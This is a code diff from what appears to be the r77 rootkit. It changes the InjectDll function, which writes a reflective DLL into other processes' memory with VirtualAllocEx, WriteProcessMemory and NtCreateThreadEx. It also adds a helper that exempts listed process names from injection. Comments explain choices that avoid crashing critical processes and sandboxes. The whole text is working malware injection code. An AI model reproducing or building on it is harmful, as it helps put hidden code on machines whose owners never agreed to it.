@@ -445,44 +445,48 @@ BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize, BOOL fast)
 		HANDLE process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, processId);
 		if (process)
 		{
-			// Do not inject critical processes (smss, csrss, wininit, etc.).
-			ULONG breakOnTermination;
-			if (NT_SUCCESS(NtQueryInformationProcess(process, PROCESSINFOCLASS::ProcessBreakOnTermination, &breakOnTermination, sizeof(ULONG), NULL)) && !breakOnTermination)
+			// Check, if the executable name is on the exclusion list (see: PROCESS_EXCLUSIONS)
+			if (!IsProcessExcluded(processId))
 			{
-				// Sandboxes tend to crash when injecting shellcode. Only inject medium IL and above.
-				DWORD integrityLevel;
-				if (GetProcessIntegrityLevel(process, &integrityLevel) && integrityLevel >= SECURITY_MANDATORY_MEDIUM_RID)
+				// Do not inject critical processes (smss, csrss, wininit, etc.).
+				ULONG breakOnTermination;
+				if (NT_SUCCESS(NtQueryInformationProcess(process, PROCESSINFOCLASS::ProcessBreakOnTermination, &breakOnTermination, sizeof(ULONG), NULL)) && !breakOnTermination)
 				{
-					// Get function pointer to the shellcode that loads the DLL reflectively.
-					DWORD entryPoint = GetReflectiveDllMain(dll);
-					if (entryPoint)
+					// Sandboxes tend to crash when injecting shellcode. Only inject medium IL and above.
+					DWORD integrityLevel;
+					if (GetProcessIntegrityLevel(process, &integrityLevel) && integrityLevel >= SECURITY_MANDATORY_MEDIUM_RID)
 					{
-						LPBYTE allocatedMemory = (LPBYTE)VirtualAllocEx(process, NULL, dllSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-						if (allocatedMemory)
+						// Get function pointer to the shellcode that loads the DLL reflectively.
+						DWORD entryPoint = GetReflectiveDllMain(dll);
+						if (entryPoint)
 						{
-							if (WriteProcessMemory(process, allocatedMemory, dll, dllSize, NULL))
+							LPBYTE allocatedMemory = (LPBYTE)VirtualAllocEx(process, NULL, dllSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+							if (allocatedMemory)
 							{
-								HANDLE thread = NULL;
-								if (NT_SUCCESS(nt::NtCreateThreadEx(&thread, 0x1fffff, NULL, process, (LPTHREAD_START_ROUTINE)(allocatedMemory + entryPoint), allocatedMemory, 0, 0, 0, 0, NULL)) && thread)
+								if (WriteProcessMemory(process, allocatedMemory, dll, dllSize, NULL))
 								{
-									if (fast)
+									HANDLE thread = NULL;
+									if (NT_SUCCESS(nt::NtCreateThreadEx(&thread, 0x1fffff, NULL, process, (LPTHREAD_START_ROUTINE)(allocatedMemory + entryPoint), allocatedMemory, 0, 0, 0, 0, NULL)) && thread)
 									{
-										// Fast mode is for bulk operations, where the return value of this function is ignored.
-										// The return value of DllMain is not checked. This function just returns TRUE, if NtCreateThreadEx succeeded.
-										result = TRUE;
-									}
-									else if (WaitForSingleObject(thread, 100) == WAIT_OBJECT_0)
-									{
-										// Return TRUE, only if DllMain returned TRUE.
-										// DllMain returns FALSE, for example, if r77 is already injected.
-										DWORD exitCode;
-										if (GetExitCodeThread(thread, &exitCode))
+										if (fast)
 										{
-											result = exitCode != 0;
+											// Fast mode is for bulk operations, where the return value of this function is ignored.
+											// The return value of DllMain is not checked. This function just returns TRUE, if NtCreateThreadEx succeeded.
+											result = TRUE;
 										}
-									}
+										else if (WaitForSingleObject(thread, 100) == WAIT_OBJECT_0)
+										{
+											// Return TRUE, only if DllMain returned TRUE.
+											// DllMain returns FALSE, for example, if r77 is already injected.
+											DWORD exitCode;
+											if (GetExitCodeThread(thread, &exitCode))
+											{
+												result = exitCode != 0;
+											}
+										}
 
-									CloseHandle(thread);
+										CloseHandle(thread);
+									}
 								}
 							}
 						}
@@ -601,6 +605,23 @@ VOID UnhookDll(LPCWSTR name)
 			FreeLibrary(dll);
 		}
 	}
+}
+BOOL IsProcessExcluded(DWORD processId)
+{
+	WCHAR processName[MAX_PATH + 1];
+	if (GetProcessFileName(processId, FALSE, processName, MAX_PATH))
+	{
+		LPCWSTR exclusions[] = PROCESS_EXCLUSIONS;
+		for (int i = 0; i < sizeof(exclusions) / sizeof(LPCWSTR); i++)
+		{
+			if (!lstrcmpiW(processName, exclusions[i]))
+			{
+				return TRUE;
+			}
+		}
+	}
+
+	return FALSE;
 }
 
 PINTEGER_LIST CreateIntegerList()
